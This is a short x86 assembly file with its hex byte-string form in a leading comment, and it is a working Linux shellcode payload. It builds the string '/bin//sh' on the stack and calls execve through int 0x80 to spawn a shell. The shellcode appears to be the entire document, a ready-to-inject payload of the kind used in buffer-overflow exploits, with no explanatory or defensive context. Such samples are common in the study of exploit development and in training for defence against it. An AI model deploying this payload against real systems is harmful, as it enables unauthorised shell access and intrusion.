; \x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\x6a\x0b\x58\xcd\x80
section .text
    global _start

_start:

    xor eax, eax
    push eax
    push dword 0x68732f6e
    push dword 0x69622f2f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    mov edx, eax
    push 0xb
    pop eax
    int 0x80                     